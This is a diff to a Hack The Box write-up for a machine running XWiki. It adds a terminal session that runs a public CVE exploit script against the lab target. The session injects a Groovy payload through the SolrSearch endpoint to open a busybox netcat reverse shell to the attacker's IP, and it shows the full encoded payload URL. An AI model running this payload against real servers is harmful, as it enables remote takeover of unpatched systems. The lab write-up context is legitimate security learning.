@@ -53,6 +53,17 @@ It looks like an HTTP service running on port 80 and an xwiki on port 8080. Here
 
 ## CVE Exploit
 There does not exist any working Metasploit module yet, but we have [this GitHub link](https://github.com/gunzf0x/CVE-2025-24893/blob/main/CVE-2024-24893.py) that implements the exploit to achieve remote RCE. We can use this to spawn a shell locally and navigate the target system. 
+```
+┌──(truelyyours㉿kali)-[~/htb/editor]
+└─$ python3 CVE-2025-24893.py -t 'http://10.10.11.80:8080' -c 'busybox nc 10.10.16.16 4444 -e /bin/bash'
+[*] Attacking http://10.10.11.80:8080
+[*] Injecting the payload:
+http://10.10.11.80:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D%22busybox%20nc%2010.10.16.16%204444%20-e%20/bin/bash%22.execute%28%29%7B%7B/groovy%7D%7D%7B%7B/async%7D%7D
+[*] Command executed
+
+~Happy Hacking
+```
+
 ![[Pasted image 20250810030501.png]]
 
 
